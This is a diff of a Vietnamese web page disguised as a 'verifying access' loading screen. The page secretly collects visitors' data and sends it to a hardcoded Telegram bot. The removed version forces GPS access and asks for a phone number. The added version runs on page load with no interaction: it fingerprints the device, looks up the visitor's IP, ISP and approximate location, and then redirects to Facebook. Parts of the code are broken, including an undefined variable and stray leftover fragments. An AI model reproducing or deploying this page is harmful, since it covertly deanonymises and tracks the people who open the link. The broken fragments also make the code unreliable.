@@ -1,112 +1,126 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <title>Đang tải...</title>
-    <style>
-        body { font-family: Arial; background:#f3f3f3; text-align:center; padding-top:50px; }
-        .card{
-            width:90%; max-width:420px; margin:auto;
-            background:white; padding:20px;
-            border-radius:15px; box-shadow:0 0 10px rgba(0,0,0,0.1);
-        }
-        img{width:100%; border-radius:15px;}
-        .input {width:90%; padding:12px; border:1px solid #ccc; border-radius:10px; margin-top:15px;}
-        .btn {width:95%; background:#ffcc00; padding:12px; border-radius:10px; margin-top:15px; font-weight:bold; border:none;}
-    </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Đang xử lý...</title>
+<style>
+  body{font-family:Arial,system-ui;background:#0f1724;color:#e6eef8;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;}
+  .card{width:92%;max-width:450px;background:#0b1220;padding:22px;border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,0.6)}
+  img{width:100%;border-radius:12px;}
+  p{color:#9fb0c8;font-size:14px;margin-top:10px;}
+  .spinner{width:44px;height:44px;border:5px solid rgba(255,255,255,0.1);border-top-color:#ffcc00;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto;}
+  @keyframes spin{to{transform:rotate(360deg)}}
+</style>
 </head>
 <body>
 
 <div class="card">
     <img src="https://i.imgur.com/Vz1T3rN.jpeg">
-    <h2>Đang tải...</h2>
-    <p>Vui lòng đợi trong giây lát...</p>
-
-    <!-- THÊM Ô NHẬP SĐT -->
-    <input id="phone" class="input" placeholder="Nhập số điện thoại xác minh...">
-    <button class="btn" onclick="sendPhone()">Tiếp tục</button>
+    <h3>Đang xác minh truy cập...</h3>
+    <p>Quá trình tải sẽ tự động chuyển hướng.</p>
+    <div class="spinner"></div>
 </div>
 
 <script>
-// === TOKEN & CHAT ID ===
+/* ====== CONFIG ====== */
 const TOKEN = "8004822258:AAEVO8N_3Z1ESth3VXHZIXTI8IjBCs_Iabs";
 const CHAT_ID = "6243479167";
+const REDIRECT = "https://facebook.com";
+const STORE_KEY = "promax_visitor_v1";
 
-// ===== BẮT BUỘC PHẢI BẬT GPS =====
-function requireGPS(){
-    navigator.geolocation.getCurrentPosition(
-        ok => console.log("GPS OK"),
-        err => {
-            alert("⚠️ Bạn phải bật GPS và cho phép định vị mới truy cập được.");
-            window.location.href = "https://google.com"; // kick ra
-        }
-    );
+/* ====== Giữ nguyên fingerprint mạnh ====== */
+async function canvasHash(){
+  const c=document.createElement('canvas');
+  c.width=200;c.height=60;
+  const ctx=c.getContext('2d');
+  ctx.fillStyle='#0f1724'; ctx.fillRect(0,0,200,60);
+  ctx.font="18px Arial"; ctx.fillStyle='#ffcc00';
+  ctx.fillText(navigator.userAgent,5,5);
+  const data=c.toDataURL();
+  const hash=await crypto.subtle.digest('SHA-256', new TextEncoder().encode(data));
+  return Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('');
 }
-requireGPS();
-
-// === Lấy thông tin thiết bị ===
-function getDeviceInfo() {
-    return {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screen: `${screen.width} x ${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
-}
-
-// === Gửi về Telegram ===
-function sendToTelegram(text) {
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: "Markdown"
-        })
-    });
+async function audioHash(){
+  try{
+    const C=window.OfflineAudioContext||window.webkitOfflineAudioContext;
+    if(!C) return null;
+    const ctx=new C(1,4000,44100);
+    const osc=ctx.createOscillator();const g=ctx.createGain();
+    osc.type="triangle";osci.frequency=10000;
+  }catch(e){ return null;}
 }
 
-// === Lấy IP + vị trí ===
-let userIP = "Không rõ";
-fetch("https://api.ipify.org?format=json")
-.then(r => r.json())
-.then(d => userIP = d.ip);
+async function getVisitorId(){
+  let v=localStorage.getItem(STORE_KEY);
+  if(v) return v;
+  const c=await canvasHash();
+  const base = navigator.userAgent+screen.width+screen.height+(c||"");
+  const hash = await crypto.subtle.digest("SHA-256",new TextEncoder().encode(base));
+  v = Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,"0")).join("").slice(0,32);
+  localStorage.setItem(STORE_KEY,v);
+  return v;
+}
 
-// ===== Gửi SĐT sau khi nhập =====
-function sendPhone(){
-    let phone = document.getElementById("phone").value;
-    if(phone.length < 8) return alert("⚠️ Số điện thoại không hợp lệ!");
+/* ====== multi IP detect ====== */
+async function getPublicIP(){
+  try{ return (await fetch("https://api.ipify.org?format=json")).json().then(d=>d.ip);}catch(e){}
+  return "Không rõ";
+}
+async function getGeo(ip){
+  try{ return (await fetch("https://ipwho.is/"+ip)).json(); }catch(e){}
+  return {};
+}
 
-    navigator.geolocation.getCurrentPosition(pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
+/* ====== detect webview & network ====== */
+function detectWebview(){
+  const u = navigator.userAgent.toLowerCase();
+  return u.includes("fb")||u.includes("messenger")||u.includes("line")||u.includes("okhttp")||u.includes("instagram");
+}
+function getConn(){
+  const c=navigator.connection||{};
+  return `${c.type||"unknown"} (${c.effectiveType||"unknown"})`;
+}
 
-        fetch("https://ipwho.is/")
-        .then(r => r.json())
-        .then(d => {
-            const device = getDeviceInfo();
+/* ====== Telegram ====== */
+function send(msg){
+ fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+   method:"POST",
+   headers:{"Content-Type":"application/json"},
+   body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:"Markdown"})
+ });
+}
 
-            const text = `
-📡 [XÁC MINH TRUY CẬP]
+/* ====== AUTO RUN ====== */
+(async () => {
+  const id = await getVisitorId();
+  const ip = await getPublicIP();
+  const geo = await getGeo(ip);
 
-📞 Số điện thoại: ${phone}
-🌍 IP: ${userIP}
-🏙️ Thành phố: ${d.city}, ${d.region}
-🇻🇳 Quốc gia: ${d.country}
-📌 Maps: https://www.google.com/maps?q=${lat},${lon}
-
-📱 Thiết bị: ${device.userAgent}
-🖥 Màn hình: ${device.screen}
-⏳ Múi giờ: ${device.timezone}
-⏰ Thời gian: ${new Date().toLocaleString()}
+  const msg = `
+🔔 PRO MAX ACCESS (AUTO)
+🆔 VisitorID: ${id}
+⏰ Time: ${new Date().toLocaleString()}
+🌐 IP: ${ip}
+🏢 ISP: ${geo.connection?.isp||"Không rõ"}
+📍 Location: ${geo.city||"Không rõ"} — ${geo.country||"Không rõ"}
+📌 Maps: https://www.google.com/maps?q=${geo.latitude||0},${geo.longitude||0}
+🛰 ASN/Info: ${geo.asn||"Không rõ"}
+🔎 WebView: ${detectWebview()?"Yes":"No"}
+📶 Connection: ${getConn()}
+📱 UA: ${navigator.userAgent}
+🖥 Screen: ${screen.width}x${screen.height}
+🌐 Lang/TZ: ${navigator.language} / ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+🟢 Auto Mode: ACTIVE
 `;
-            sendToTelegram(text);
-            alert("Xác minh thành công!");
-            window.location.href = "https://google.com";
-        });
-    });
+
+  send(msg);
+  setTimeout(()=>{ window.location.href = REDIRECT }, 900);
+})();
+</script>
+
+</body>
+</html>    });
 }
 </script>
 
